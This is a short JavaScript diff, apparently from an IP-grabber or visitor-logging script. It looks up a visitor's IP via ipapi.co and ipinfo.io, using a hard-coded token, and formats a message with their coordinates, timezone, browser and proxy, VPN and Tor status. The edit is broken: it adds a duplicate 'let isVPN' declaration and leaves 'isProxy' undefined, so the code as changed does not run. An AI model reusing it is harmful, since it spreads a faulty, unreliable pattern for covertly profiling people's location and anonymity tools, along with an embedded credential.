@@ -108,8 +108,9 @@ fetch('https://ipapi.co/json/')
 fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
 .then(response => response.json())
 .then(data => {
-  let isProxy = data.proxy ? true : false;
+  let isVPN = data.privacy && data.privacy.proxy ? true : false;
   let isVPN = data.privacy && data.privacy.vpn ? true : false;
+  let isTOR = data.privacy && data.privacy.tor ? true : false;
         
         const message = `
       * Ip 🌐*
@@ -121,6 +122,7 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
     *├ Timezone IP: ${time}*
     *├ Proxy: ${isProxy}*
     *├ Vpn: ${isVPN}*
+    *├ Tor: ${isTOR}*
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
